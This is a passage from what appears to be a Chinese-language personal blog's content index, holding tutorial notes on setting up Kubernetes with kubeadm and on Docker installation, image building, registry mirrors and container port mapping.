/etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config或？sudo cp /etc/kubernetes/admin.conf $HOME/sudo chown $(id -u):$(id -g) $HOME/admin.confexport KUBECONFIG=$HOME/admin.conf或？export KUBECONFIG=/etc/kubernetes/admin.conf</code></pre><p>添加网络插件</p><blockquote><p>部署weave网络</p></blockquote><pre><code>sysctl net.bridge.bridge-nf-call-iptables=1 -wkubectl apply -f &quot;https://cloud.weave.works/k8s/net?k8s-version=$(kubectl version | base64 | tr -d &#39;\n&#39;)&quot;</code></pre><p>准备计算资源</p><blockquote><p>因为我只有1个节点，要“计算资源”的话，就只能将master节点的taint去掉，否则普通的Pod默认不会调度上来。</p></blockquote><pre><code>kubectl taint nodes --all node-role.kubernetes.io/master-</code></pre><blockquote><p>如果你有多个节点的话，不需要去掉master的taint。其他节点参照上面的准备阶段在各个节点上做好准备工作以后，只要再Join一下就行了。Join命令在kubeadm init的输出信息里有。</p></blockquote><pre><code>kubeadm join --token={token} {master ip:6443}</code></pre><p>安装weave scope</p><pre><code>kubectl apply -f &quot;https://cloud.weave.works/k8s/scope.yaml?k8s-version=$(kubectl version | base64 | tr -d &#39;\n&#39;)&quot;</code></pre><p>查看是否安装成功</p><pre><code>kubectl get pods -n kube-system</code></pre><p>WARNING solve</p><pre><code>[WARNING IsDockerSystemdCheck]: detected &quot;cgroupfs&quot; as the Docker cgroup driver# [警告IsDockerSystemdCheck]：检测到“cgroupfs”作为Docker cgroup驱动程序。 推荐的驱动程序是“systemd”。# 参考： https://blog.csdn.net/m82_a1/article/details/97626309在/etc/docker下创建daemon.json并编辑：mkdir /etc/docker/daemon.json加入以下内容：{ &quot;exec-opts&quot;:[&quot;native.cgroupdriver=systemd&quot;]}重启dockersystemctl restart dockersystemctl status docker</code></pre><p>token</p><pre><code>如果您没有令牌，可以通过在主节点上运行以下命令来获取它kubeadm token list默认情况下，令牌在24小时后过期。 如果需要在当前令牌过期后将节点加入集群，可以通过在主节点上运行以下命令来创建新令牌kubeadm token create</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> k8s </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 简介.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E7%AE%80%E4%BB%8B/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>参考： <a href="https://blog.csdn.net/zmx729618/article/details/72930474/" target="_blank" rel="noopener">https://blog.csdn.net/zmx729618/article/details/72930474/</a></p><blockquote><p>Docker 守护进程</p></blockquote><p>Docker 守护进程运行在一台主机上。用户并不直接和守护进程进行交互，而是通过 Docker 客户端间接和其通信。</p><blockquote><p>Docker 客户端</p></blockquote><p>Docker 客户端，实际上是 docker 的二进制程序，是主要的用户与 Docker 交互方式。它接收用户指令并且与背后的 Docker 守护进程通信，如此来回往复。</p><blockquote><p>Docker 内部</p></blockquote><p>要理解 Docker 内部构建，需要理解以下三种部件：</p><ul><li>Docker 镜像 - Docker images</li><li>Docker 仓库 - Docker registeries</li><li>Docker 容器 - Docker containers</li></ul><ol><li>Docker 镜像</li></ol><p>Docker 镜像是 Docker 容器运行时的只读模板，每一个镜像由一系列的层 (layers) 组成。Docker 使用 UnionFS 来将这些层联合到单独的镜像中。  </p><p>UnionFS 允许独立文件系统中的文件和文件夹(称之为分支)被透明覆盖，形成一个单独连贯的文件系统。正因为有了这些层的存在，Docker 是如此的轻量。  </p><p>当你改变了一个 Docker 镜像，比如升级到某个程序到新的版本，一个新的层会被创建。因此，不用替换整个原先的镜像或者重新建立(在使用虚拟机的时候你可能会这么做)，只是一个新 的层被添加或升级了。现在你不用重新发布整个镜像，只需要升级，层使得分发 Docker 镜像变得简单和快速。</p><ol start="2"><li>Docker 仓库</li></ol><p>Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。  </p><p>同样的，Docker 仓库也有公有和私有的概念。公有的 Docker 仓库名字是 Docker Hub。Docker Hub 提供了庞大的镜像集合供使用。这些镜像可以是自己创建，或者在别人的镜像基础上创建。Docker 仓库是 Docker 的分发部分。</p><ol start="3"><li>Docker 容器</li></ol><p>Docker 容器和文件夹很类似，一个Docker容器包含了所有的某个应用运行所需要的环境。每一个 Docker 容器都是从 Docker 镜像创建的。Docker 容器可以运行、开始、停止、移动和删除。每一个 Docker 容器都是独立和安全的应用平台，Docker 容器是 Docker 的运行部分。</p>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 环境.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E7%8E%AF%E5%A2%83/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>官方文档：<a href="https://docs.docker-cn.com/" target="_blank" rel="noopener">https://docs.docker-cn.com/</a></p><hr><p><em>docker 容器应该被视为一个进程，这个是理解和定义docker的一条基本原则；别把docker看成一个虚拟机</em></p><p>环境</p><blockquote><p>内核需要3.10+</p></blockquote><pre><code># 查看信息uname -runame -a</code></pre><p>安装<br>（不建议在正式部署时使用，这里只是学习，有风险）</p><pre><code>wget -qO- https://get.docker.com/ | sh</code></pre><blockquote><p>当要以非root用户可以直接运行docker时，需要执行 sudo usermod -aG docker username 命令，然后重新登陆</p></blockquote><pre><code>sudo usermod -aG docker username</code></pre><p>启动docker后台服务</p><pre><code>sudo service docker start</code></pre><p>测试运行hello-world</p><pre><code>docker run hello-world</code></pre><p>镜像加速</p><pre><code>鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，这里使用的是网易的镜像地址：http://hub-mirror.c.163.com。新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者%programdata%\docker\config\daemon.json（Windows） 来配置 Daemon。请在该配置文件中加入（没有该文件的话，请先建一个）：{  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]}</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 构建镜像.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F/</url>
      
        <content type="html"><![CDATA[<p>参考：<br><a href="https://account.daocloud.io/signin" target="_blank" rel="noopener">daoCloud平台</a>使用</p><hr><h4 id="从容器构建image"><a href="#从容器构建image" class="headerlink" title="从容器构建image"></a>从容器构建image</h4><ol><li>先对已经运行的(存在)容器进行一些修改，例如 apt update，更新一下软件包</li></ol><pre><code>docker run -i -t ubuntu:14.04 /bin/bashapt update &amp;&amp; apt install -y vim# 重新进入容器# docker container exec -it 7054aa92bf8e /bin/bash# docker attact 7054aa92bf8e</code></pre><ol start="2"><li>commit命令用来将容器转化为镜像，运行下面的命令，我们可以讲刚刚的容器转换为镜像:</li></ol><pre><code># docker commit 的语法格式为：# docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]sudo docker commit -m &quot;Added nginx from ubuntu14.04&quot; -a &quot;saymagic&quot; 79c761f627f3 saymagic/ubuntu-nginx:v1说明-m: 参数用来来指定提交的说明信息-a: 可以指定用户信息的79c761f627f3: 代表的是容器的idsaymagic/ubuntu-nginx:v1: 指定目标镜像的用户名、仓库名和tag信息。创建成功后会返回这个镜像的ID信息。# 还可以用 docker history 具体查看镜像内的历史记录docker history nginx:v2# 示例，手动构建完镜像之后要进行清理，以此来减小镜像体积FROM debian:stretchRUN buildDeps=&#39;gcc libc6-dev make wget&#39; \    &amp;&amp; apt-get update \    &amp;&amp; apt-get install -y $buildDeps \    &amp;&amp; wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot; \    &amp;&amp; mkdir -p /usr/src/redis \    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \    &amp;&amp; make -C /usr/src/redis \    &amp;&amp; make -C /usr/src/redis install \    &amp;&amp; rm -rf /var/lib/apt/lists/* \    &amp;&amp; rm redis.tar.gz \    &amp;&amp; rm -r /usr/src/redis \    &amp;&amp; apt-get purge -y --auto-remove $buildDeps</code></pre><h4 id="从dockerfile构建image"><a href="#从dockerfile构建image" class="headerlink" title="从dockerfile构建image"></a>从dockerfile构建image</h4><ol><li>进入一个目录，新建目录 www,在其中添加index.html文件</li></ol><ol start="2"><li>编写Dockerfile文件<pre><code># filename: DockerfileFROM ubuntu:14.04MAINTAINER zhuzhenyuan&lt;zhenyuanzhu@outlook.com&gt;RUN apt-get update &amp;&amp; apt-get install -y nginxCOPY ./www /usr/share/nginx/htmlEXPOSE 80CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;]</code></pre></li></ol><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>第一行是用来声明我们的镜像是基于什么构建的，这里我们指定为ubuntu14.04<br>第二行的作用在于说明维护者。<br>第三行和第四行的RUN命令用来在容器内部的shell里执行命令。<br>第五行将当前系统的www文件夹拷贝到容器的/usr/share/nginx/html目录下<br>第六行声明当前需要对外开放80端口<br>最后一行表示运行容器时开启nginx。</p><pre><code>&gt; 为什么daemon off;  docker 容器默认会把容器内部第一个进程，也就是pid=1的程序作为docker容器是否正在运行的依据，如果docker 容器pid挂了，那么docker容器便会直接退出&gt; docker run的时候把command作为容器内部命令，如果你使用nginx，那么nginx程序将后台运行，这个时候nginx并不是pid为1的程序，而是执行的bash，这个bash执行了nginx指令后就挂了，所以容器也就退出了，和你这个一样的道理，pm2 start 过后，bash 的pid为1，那么此时bash执行完以后会退出，所以容器也就退出了。3. 构建</code></pre><h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><p>docker build [选项] &lt;上下文路径/URL/-&gt;</p><h1 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h1><h1 id="docker-image-build"><a href="#docker-image-build" class="headerlink" title="docker image build"></a>docker image build</h1><p>示例 Dockerfile在当前目录<br>docker build -t zhuzhenyuan/ubuntu:test.0.0.2 .<br>docker build -t=”zhuzhenyuan/ubuntu:test.0.0.2” .<br>docker image build -t ubuntu .<br>docker image build -t ubuntu:test.0.0.2 .</p><p>-f: 可以指定docker file</p><p>镜像构建上下文（Context）<br>docker build 命令最后有一个 .。. 表示当前目录，而 Dockerfile 就在当前目录<br>Docker 在运行时分为 Docker 引擎（也就是服务端守护进程）和客户端工具，构建是在服务端守护进程执行</p><p>当构建的时候，用户会指定构建镜像上下文的路径，docker build 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。<br>这样 Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。</p><p>如果在 Dockerfile 中这么写：</p><p>COPY ./package.json /app/<br>这并不是要复制执行 docker build 命令所在的目录下的 package.json，也不是复制 Dockerfile 所在目录下的 package.json，而是复制 上下文（context） 目录下的 package.json</p><p>.dockerignore<br>如果目录下有些东西确实不希望构建时传给 Docker 引擎，那么可以用 .gitignore 一样的语法写一个，该文件是用于剔除不需要作为上下文传递给 Docker 引擎的。</p><p>这只是默认行为，实际上 Dockerfile 的文件名并不要求必须为 Dockerfile，而且并不要求必须位于上下文目录中，比如可以用 -f ../Dockerfile.php 参数指定某个文件作为 Dockerfile。</p><p>一般习惯性的会使用默认的文件名 Dockerfile，以及会将其置于镜像构建上下文目录中</p><pre><code>&gt; 上面代码中,-t参数用来指定image文件的名字,后面还可以用冒号指定标签,如果不指定,默认标签就是latest,最后那个.表示Dockerfile文件所在的路径.这个例子Dockerfile文件在当前路径,所以就是一个.生成容器</code></pre><h1 id="上面的例子运行"><a href="#上面的例子运行" class="headerlink" title="上面的例子运行"></a>上面的例子运行</h1><p>docker run -p 8000:80 -d zhuzhenyuan/ubuntu:test.0.0.2</p><h1 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h1><p>docker container run -p 8000:80 -it zhuzhenyuan/ubuntu:test.0.0.2 /bin/bash</p><pre><code>&gt; 上传image发布image文件  首先，去 hub.docker.com 或 cloud.docker.com注册一个账户。然后，用下面的命令登录</code></pre><p>docker login<br>docker logout # 退出登录</p><pre><code>接着，为本地的 image 标注用户名和版本。</code></pre><h1 id="设置镜像标签"><a href="#设置镜像标签" class="headerlink" title="设置镜像标签"></a>设置镜像标签</h1><p>docker tag [imageName] [username]/[repository]:[tag]<br>docker image tag [imageName] [username]/[repository]:[tag]</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>docker tag 860c279d2fec runoob/centos:dev<br>docker image tag koa-demos:0.0.1 ruanyf/koa-demos:0.0.1</p><pre><code>也可以不标注用户名，重新构建一下 image 文件。重新构建</code></pre><p>$ docker image build -t [username]/[repository]:[tag] .</p><pre><code>最后，发布 image 文件。</code></pre><h1 id="docker-push"><a href="#docker-push" class="headerlink" title="docker push"></a>docker push</h1><p>docker image push [username]/[repository]:[tag]</p><pre><code>#### 其它 docker build 的用法&gt; 直接用 Git repo 进行构建docker build 还支持从 URL 构建，比如可以直接从 Git repo 中构建：</code></pre><p>docker build <a href="https://github.com/twang2218/gitlab-ce-zh.git#:11.1" target="_blank" rel="noopener">https://github.com/twang2218/gitlab-ce-zh.git#:11.1</a></p><h1 id="这行命令指定了构建所需的-Git-repo，并且指定默认的-master-分支，构建目录为-11-1-，"><a href="#这行命令指定了构建所需的-Git-repo，并且指定默认的-master-分支，构建目录为-11-1-，" class="headerlink" title="这行命令指定了构建所需的 Git repo，并且指定默认的 master 分支，构建目录为 /11.1/，"></a>这行命令指定了构建所需的 Git repo，并且指定默认的 master 分支，构建目录为 /11.1/，</h1><h1 id="然后-Docker-就会自己去-git-clone-这个项目、切换到指定分支、并进入到指定目录后开始构建。"><a href="#然后-Docker-就会自己去-git-clone-这个项目、切换到指定分支、并进入到指定目录后开始构建。" class="headerlink" title="然后 Docker 就会自己去 git clone 这个项目、切换到指定分支、并进入到指定目录后开始构建。"></a>然后 Docker 就会自己去 git clone 这个项目、切换到指定分支、并进入到指定目录后开始构建。</h1><pre><code>&gt; 用给定的 tar 压缩包构建</code></pre><p>docker build <a href="http://server/context.tar.gz" target="_blank" rel="noopener">http://server/context.tar.gz</a></p><h1 id="如果所给出的-URL-不是个-Git-repo，而是个-tar-压缩包，"><a href="#如果所给出的-URL-不是个-Git-repo，而是个-tar-压缩包，" class="headerlink" title="如果所给出的 URL 不是个 Git repo，而是个 tar 压缩包，"></a>如果所给出的 URL 不是个 Git repo，而是个 tar 压缩包，</h1><h1 id="那么-Docker-引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。"><a href="#那么-Docker-引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。" class="headerlink" title="那么 Docker 引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。"></a>那么 Docker 引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。</h1><pre><code>&gt; 从标准输入中读取 Dockerfile 进行构建</code></pre><p>docker build - &lt; Dockerfile<br>或<br>cat Dockerfile | docker build -</p><h1 id="如果标准输入传入的是文本文件，则将其视为-Dockerfile，"><a href="#如果标准输入传入的是文本文件，则将其视为-Dockerfile，" class="headerlink" title="如果标准输入传入的是文本文件，则将其视为 Dockerfile，"></a>如果标准输入传入的是文本文件，则将其视为 Dockerfile，</h1><h1 id="并开始构建。这种形式由于直接从标准输入中读取-Dockerfile-的内容，"><a href="#并开始构建。这种形式由于直接从标准输入中读取-Dockerfile-的内容，" class="headerlink" title="并开始构建。这种形式由于直接从标准输入中读取 Dockerfile 的内容，"></a>并开始构建。这种形式由于直接从标准输入中读取 Dockerfile 的内容，</h1><h1 id="它没有上下文，因此不可以像其他方法那样可以将本地文件-COPY-进镜像之类的事情。"><a href="#它没有上下文，因此不可以像其他方法那样可以将本地文件-COPY-进镜像之类的事情。" class="headerlink" title="它没有上下文，因此不可以像其他方法那样可以将本地文件 COPY 进镜像之类的事情。"></a>它没有上下文，因此不可以像其他方法那样可以将本地文件 COPY 进镜像之类的事情。</h1><pre><code>&gt; 从标准输入中读取上下文压缩包进行构建</code></pre><p>docker build - &lt; context.tar.gz</p><h1 id="如果发现标准输入的文件格式是-gzip、bzip2-以及-xz-的话，"><a href="#如果发现标准输入的文件格式是-gzip、bzip2-以及-xz-的话，" class="headerlink" title="如果发现标准输入的文件格式是 gzip、bzip2 以及 xz 的话，"></a>如果发现标准输入的文件格式是 gzip、bzip2 以及 xz 的话，</h1><h1 id="将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。"><a href="#将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。" class="headerlink" title="将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。"></a>将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。</h1><pre><code>#### 其它制作镜像的方式&gt; 从 rootfs 压缩包导入</code></pre><p>格式：docker import [选项] &lt;文件&gt;|<URL>|- [&lt;仓库名&gt;[:&lt;标签&gt;]]</p><h1 id="压缩包可以是本地文件、远程-Web-文件，甚至是从标准输入中得到。"><a href="#压缩包可以是本地文件、远程-Web-文件，甚至是从标准输入中得到。" class="headerlink" title="压缩包可以是本地文件、远程 Web 文件，甚至是从标准输入中得到。"></a>压缩包可以是本地文件、远程 Web 文件，甚至是从标准输入中得到。</h1><h1 id="压缩包将会在镜像-目录展开，并直接作为镜像第一层提交。"><a href="#压缩包将会在镜像-目录展开，并直接作为镜像第一层提交。" class="headerlink" title="压缩包将会在镜像 / 目录展开，并直接作为镜像第一层提交。"></a>压缩包将会在镜像 / 目录展开，并直接作为镜像第一层提交。</h1><p>比如我们想要创建一个 OpenVZ 的 Ubuntu 16.04 模板的镜像：</p><p>docker import <br>    <a href="http://download.openvz.org/template/precreated/ubuntu-16.04-x86_64.tar.gz" target="_blank" rel="noopener">http://download.openvz.org/template/precreated/ubuntu-16.04-x86_64.tar.gz</a> <br>    openvz/ubuntu:16.04</p><pre><code>&gt; docker save 和 docker load</code></pre><p>Docker 还提供了 docker save 和 docker load 命令，用以将镜像保存为一个文件，然后传输到另一个位置上，再加载进来。<br>这是在没有 Docker Registry 时的做法，<br>现在已经不推荐，镜像迁移应该直接使用 Docker Registry，<br>无论是直接使用 Docker Hub 还是使用内网私有 Registry 都可以。</p><p>保存镜像<br>使用 docker save 命令可以将镜像保存为归档文件。<br>保存镜像的命令为：<br>$ docker save alpine -o filename<br>$ file filename<br>filename: POSIX tar archive</p><p>这里的 filename 可以为任意名称甚至任意后缀名，但文件的本质都是归档文件<br>注意：如果同名则会覆盖（没有警告）</p><p>若使用 gzip 压缩：<br>docker save alpine | gzip &gt; alpine-latest.tar.gz<br>然后我们将 alpine-latest.tar.gz 文件复制到了到了另一个机器上，可以用下面这个命令加载镜像：</p><p>docker load -i alpine-latest.tar.gz</p><pre><code>#### 导出和导入容器</code></pre><p>导出容器<br>docker export 7691a814370e &gt; ubuntu.tar<br>这样将导出容器快照到本地文件。</p><p>导入容器快照<br>可以使用 docker import 从容器快照文件中再导入为镜像，例如</p><p>cat ubuntu.tar | docker import - test/ubuntu:v1.0</p><p>此外，也可以通过指定 URL 或者某个目录来导入，例如</p><p>docker import <a href="http://example.com/exampleimage.tgz" target="_blank" rel="noopener">http://example.com/exampleimage.tgz</a> example/imagerepo</p><p>注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。<br>这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），<br>而镜像存储文件将保存完整记录，体积也要大。<br>此外，从容器快照文件导入时可以重新指定标签等元数据信息。</p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 官方安装.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E5%AE%98%E6%96%B9%E5%AE%89%E8%A3%85/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E5%AE%98%E6%96%B9%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>更多参考： <a href="https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/install/ubuntu.html</a></p><ol start="0"><li>卸载旧版本</li></ol><blockquote><p>旧版本的 Docker 称为 docker 或者 docker-engine，使用以下命令卸载旧版本</p></blockquote><pre><code>sudo apt-get remove docker docker-engine docker.io -y</code></pre><ol><li>安装docker</li></ol><pre><code>apt-get updateapt-get install -y apt-transport-https ca-certificates curl software-properties-common# 添加 GPG 密钥，国内中科大# 鉴于国内网络问题，建议使用国内源，官方源请在注释中查看。# 为了确认所下载软件包的合法性，需要添加软件源的 GPG 密钥。curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -# 添加源，国内add-apt-repository &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;# 添加 GPG 密钥，官方# curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -# 添加源# add-apt-repository &quot;deb https://download.docker.com/linux/$(. /etc/os-release; echo &quot;$ID&quot;) $(lsb_release -cs) stable&quot;# 删除 PPA 源# 删除 PPA 源的命令格式则为：sudo add-apt-repository -r ppa:user/ppa-name# 然后进入 /etc/apt/sources.list.d 目录，将相应 ppa 源的保存文件删除。# 最后同样更新一下：sudo apt-get update#开始安装apt-get update &amp;&amp; sudo apt-get install docker-ce -y# apt-get update &amp;&amp; apt-get install -y docker-ce=$(apt-cache madison docker-ce | grep 17.03 | head -1 | awk &#39;{print $3}&#39;)</code></pre><ol start="2"><li>启动 Docker CE</li></ol><pre><code>systemctl enable dockersystemctl start docker</code></pre><ol start="3"><li>建立 docker 用户组</li></ol><blockquote><p>默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组。</p></blockquote><pre><code># 只有root的话要新建用户并切换到该用户，新建用户，useradd,adduser# 参考： https://segmentfault.com/a/1190000007316406# useradd -d /home/username -m -s /bin/bash username# 改密码# passwd username# 建立 docker 组：sudo groupadd docker# 将当前用户加入 docker 组：sudo usermod -aG docker $USER# 退出当前终端并重新登录，进行如下测试# 测试 Docker 是否安装正确docker run hello-world</code></pre><ol start="4"><li>配置docker mirror</li></ol><pre><code># 创建（或修改）/etc/docker/daemon.json。官方中国镜像速度还行。vim /etc/docker/daemon.json{&quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]}# 或者Azure 中国镜像 https://dockerhub.azk8s.cn阿里云加速器(需登录账号获取)https://cr.console.aliyun.com/cn-hangzhou/mirrors七牛云加速器 https://reg-mirror.qiniu.com{  &quot;registry-mirrors&quot;: [    &quot;https://dockerhub.azk8s.cn&quot;,    &quot;https://reg-mirror.qiniu.com&quot;  ]}# 重启docker服务systemctl restart docker</code></pre><p>检查加速器是否生效</p><pre><code>执行 $ docker info，如果从结果中看到了如下内容，说明配置成功。Registry Mirrors: https://dockerhub.azk8s.cn/</code></pre><p> gcr.io 镜像</p><pre><code>国内无法直接获取 gcr.io/* 镜像，我们可以将 gcr.io/&lt;repo-name&gt;/&lt;image-name&gt;:&lt;version&gt; 替换为 gcr.azk8s.cn/&lt;repo-name&gt;/&lt;image-name&gt;:&lt;version&gt; ,例如# $ docker pull gcr.io/google_containers/hyperkube-amd64:v1.9.2$ docker pull gcr.azk8s.cn/google_containers/hyperkube-amd64:v1.9.2</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 访问容器.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E8%AE%BF%E9%97%AE%E5%AE%B9%E5%99%A8/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E8%AE%BF%E9%97%AE%E5%AE%B9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>参考：<br><a href="https://github.com/yeasy/docker_practice" target="_blank" rel="noopener">https://github.com/yeasy/docker_practice</a></p><h4 id="外部访问容器"><a href="#外部访问容器" class="headerlink" title="外部访问容器"></a>外部访问容器</h4><p>容器中可以运行一些网络应用，要让外部也可以访问这些应用，可以通过 -P 或 -p 参数来指定端口映射。</p><blockquote><p>当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。</p></blockquote><blockquote><p>-p 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。<br>支持的格式有 ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort。</p></blockquote><pre><code>使用 docker container ls 可以看到，本地主机的 49155 被映射到了容器的 5000 端口。此时访问本机的 49155 端口即可访问容器内 web 应用提供的界面。$ docker run -d -P training/webapp python app.py同样的，可以通过 docker logs 命令来查看应用的信息。$ docker logs -f nostalgic_morse</code></pre><blockquote><p>映射所有接口地址</p></blockquote><pre><code>使用 hostPort:containerPort 格式本地的 5000 端口映射到容器的 5000 端口，可以执行$ docker run -d -p 5000:5000 training/webapp python app.py此时默认会绑定本地所有接口上的所有地址。</code></pre><blockquote><p>映射到指定地址的指定端口</p></blockquote><pre><code>可以使用 ip:hostPort:containerPort 格式指定映射使用一个特定地址，比如 localhost 地址 127.0.0.1$ docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py</code></pre><blockquote><p>映射到指定地址的任意端口</p></blockquote><pre><code>使用 ip::containerPort 绑定 localhost 的任意端口到容器的 5000 端口，本地主机会自动分配一个端口。$ docker run -d -p 127.0.0.1::5000 training/webapp python app.py还可以使用 udp 标记来指定 udp 端口$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py</code></pre><blockquote><p>查看映射端口配置</p></blockquote><pre><code>使用 docker port 来查看当前映射的端口配置，也可以查看到绑定的地址docker port nostalgic_morse 5000注意：容器有自己的内部网络和 ip 地址（使用 docker inspect 可以获取所有的变量，Docker 还可以有一个可变的网络配置。）-p 标记可以多次使用来绑定多个端口例如:$ docker run -d \    -p 5000:5000 \    -p 3000:80 \    training/webapp \    python app.py</code></pre><h4 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h4><p>运行web应用（需要端口的例子）</p><pre><code># 载入镜像docker pull training/webapp#运行docker run -d -P training/webapp python app.py-d:让容器在后台运行。-P:将容器内部使用的网络端口映射到我们使用的主机上。# 通过 -p 参数来设置不一样的端口：docker run -d -p 5000:5000 training/webapp python app.py# 查看网络端口的快捷方式docker port bf08b7f2cd89docker port wizardly_chandrasekhar查看 WEB 应用程序日志docker logs [ID或者名字] 可以查看容器内部的标准输出docker logs -f bf08b7f2cd89-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。# 检查 WEB 应用程序使用 docker inspect 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。# Docker容器 暴露多个端口# 1、创建容器时指定docker run -p &lt;host_port1&gt;:&lt;container_port1&gt; -p &lt;host_port2&gt;:&lt;container_port2&gt;# 2、修改dockerfile expose所需要的端口，这样可以免去-p参数。# 按范围暴露指定端口EXPOSE 7000-8000# 或Docker run命令：docker run –expose = 7000-8000# 或者，您可以通过Docker run命令将一系列端口发布到主机：docker run -p 7000-8000:7000-8000# 指定端口随机映射到宿主机docker run -P 80 -it ubuntu /bin/bash# 将容器ip和端口，指定映射到宿主机上docker run -p 192.168.0.100:8000:80 -it ubuntu /bin/bash# 端口映射支持的格式# 参考： https://www.jianshu.com/p/b92d4b845ed6ip:hostport:containerport #指定ip、指定宿主机port、指定容器portip::containerport #指定ip、未指定宿主机port（随机）、指定容器porthostport:containerport #未指定ip、指定宿主机port、指定容器port</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 第三方镜像服务.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E7%AC%AC%E4%B8%89%E6%96%B9%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E7%AC%AC%E4%B8%89%E6%96%B9%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>docker pull/push时<br>参考： <a href="https://my.oschina.net/u/3746745/blog/1811571" target="_blank" rel="noopener">https://my.oschina.net/u/3746745/blog/1811571</a></p>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 卷挂载.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E5%8D%B7%E6%8C%82%E8%BD%BD/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E5%8D%B7%E6%8C%82%E8%BD%BD/</url>
      
